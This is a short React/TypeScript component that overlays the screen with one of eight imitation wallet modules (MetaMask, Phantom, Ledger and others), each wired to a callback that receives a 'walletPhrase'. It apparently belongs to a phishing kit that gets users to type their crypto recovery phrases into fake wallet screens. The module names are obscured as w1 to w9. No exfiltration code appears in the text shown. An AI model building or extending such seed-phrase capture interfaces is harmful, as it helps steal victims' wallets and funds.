import Atomic from "./w1";
import Coinbase from "./w9";
import Exodus from "./w8";
import Keplr from "./w7";
import Ledger from "./w6";
import MetaMask from "./w5";
import Phantom from "./w4";
import TrustWallet from "./w2";

interface ShowManualProps {
  selectedWallet: string;
  handleFinish: (walletPhrase: string) => Promise<void>;
}

function ShowManualWallets({ selectedWallet, handleFinish }: ShowManualProps) {
  return (
    <>
      <section className="fixed inset-0 bg-black/80 flex justify-center items-center">
        {selectedWallet == "metamask" && (
          <MetaMask handleFinish={handleFinish} />
        )}
        {selectedWallet == "phantom" && <Phantom handleFinish={handleFinish} />}
        {selectedWallet == "exodus" && <Exodus handleFinish={handleFinish} />}
        {selectedWallet == "keplr" && <Keplr handleFinish={handleFinish} />}
        {selectedWallet == "atomic" && <Atomic handleFinish={handleFinish} />}
        {selectedWallet == "trustwallet" && (
          <TrustWallet handleFinish={handleFinish} />
        )}
        {selectedWallet == "coinbase" && (
          <Coinbase handleFinish={handleFinish} />
        )}
        {selectedWallet == "ledger" && <Ledger handleFinish={handleFinish} />}
      </section>
    </>
  );
}

export default ShowManualWallets;
